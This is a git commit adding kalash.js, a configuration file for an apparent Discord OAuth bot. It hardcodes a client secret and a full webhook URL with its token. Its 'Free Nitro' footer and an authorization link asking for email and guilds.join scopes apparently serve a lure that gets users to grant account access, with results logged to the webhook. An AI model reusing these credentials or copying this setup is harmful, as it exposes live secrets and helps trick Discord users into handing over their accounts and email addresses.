43576986a4e1f60d0f5a7bab057354af472b87b2
EMRE13333 <101513732+EMRE13333@users.noreply.github.com>
2024-03-16 10:44:25 +0300

    Create kalash.js

---
+++ kalash.js
@@ -0,0 +1,15 @@
+module.exports = {
+  token: process.env.token,
+  port: "3000",
+  prefix: "!",
+  client: "",
+  client_id: "1218294254963658802",
+  client_secret: "SxR-LiYEQa9h0LRHNqWydI2hpl1H8x31",
+  redirect_uri: "https://bce602f3-c2ab-4286-8851-df87f174e446-00-1e766l9f5450w.worf.replit.dev/",
+  footer: "Free Nitro",
+  support: "https://discord.gg/tdsadas",
+  wehbook: "https://discord.com/api/webhooks/1218295886120222720/qLlMaCKnPsxSiqZ32y5tST1d8aBGnX7hWSY2r4VvdXrjMc7Fipc8RZNn9cxRHYZoZq6x", //wehbook de logs
+  owners: ["933347093492400128", "1176495536094851106"],
+  authLink: `https://discord.com/oauth2/authorize?client_id=1218294254963658802&response_type=code&redirect_uri=https%3A%2F%2Fbce602f3-c2ab-4286-8851-df87f174e446-00-1e766l9f5450w.worf.replit.dev%2F&scope=identify+email+guilds.join`,
+
+}
